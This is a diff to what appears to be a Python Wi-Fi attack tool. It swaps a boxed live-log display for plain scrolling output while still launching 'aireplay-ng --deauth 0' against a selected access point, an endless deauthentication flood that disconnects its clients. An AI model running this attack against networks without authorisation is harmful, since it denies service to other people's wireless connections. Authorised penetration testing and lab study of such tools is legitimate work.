@@ -261,35 +261,6 @@ def select_target(mon_interface):
             banner.warn("invalid selection, try again")
 
 
-ATTACK_LOG_LINES = 12  # how many recent aireplay-ng lines stay visible in the box
-
-
-def _render_attack_screen(tick, target, log_lines):
-    # redraw only the box (via restore_cursor) instead of re-clearing the whole
-    # screen and reprinting the big logo/links block on every new log line —
-    # that full redraw is what made the live attack log feel slow and flickery
-    banner.restore_cursor()
-
-    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
-
-    lines = [
-        f"target essid : {target['ESSID']}",
-        f"target bssid : {target['BSSID']}",
-        f"channel      : {target['channel'].strip()}",
-        "",
-        f"{spin}  sending deauth frames...",
-        "",
-    ]
-    if log_lines:
-        lines.extend(log_lines)
-    else:
-        lines.append(f"{banner.C.MUTED}waiting for aireplay-ng output...{banner.C.RESET}")
-    lines.append("")
-    lines.append(f"{banner.C.MUTED}press ctrl+c to stop{banner.C.RESET}")
-
-    banner.box(lines, title="aireplay-ng log", accent=banner.C.CYAN)
-
-
 def launch_attack(mon_interface, target):
     banner.module_banner("wifi")
     banner.section("launching deauthentication attack", accent=banner.C.CYAN)
@@ -308,7 +279,12 @@ def launch_attack(mon_interface, target):
 
     banner.module_banner("wifi")
     banner.section("deauthentication attack running", accent=banner.C.CYAN)
-    banner.save_cursor()
+    print(f"  target essid  : {target['ESSID']}")
+    print(f"  target bssid  : {bssid}")
+    print(f"  channel       : {channel}")
+    print()
+    banner.info("sending deauth frames... (press ctrl+c to stop)")
+    print()
 
     attack_proc = subprocess.Popen(
         ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
@@ -318,18 +294,14 @@ def launch_attack(mon_interface, target):
         bufsize=1,
     )
 
-    # tail the raw output into a fixed-size, boxed log instead of letting
-    # aireplay-ng's endless per-second lines scroll the whole terminal
-    log_lines = []
-    tick = 0
+    # let the log lines print and scroll naturally instead of redrawing a
+    # bordered box on every line — that constant clear-and-reprint of the
+    # whole box is what made the live log feel choppy
     try:
         for line in attack_proc.stdout:
             line = line.rstrip("\n").strip()
             if line:
-                log_lines.append(line)
-                del log_lines[:-ATTACK_LOG_LINES]
-            _render_attack_screen(tick, target, log_lines)
-            tick += 1
+                print(f"  {banner.C.MUTED}{line}{banner.C.RESET}")
     except KeyboardInterrupt:
         pass
     finally:
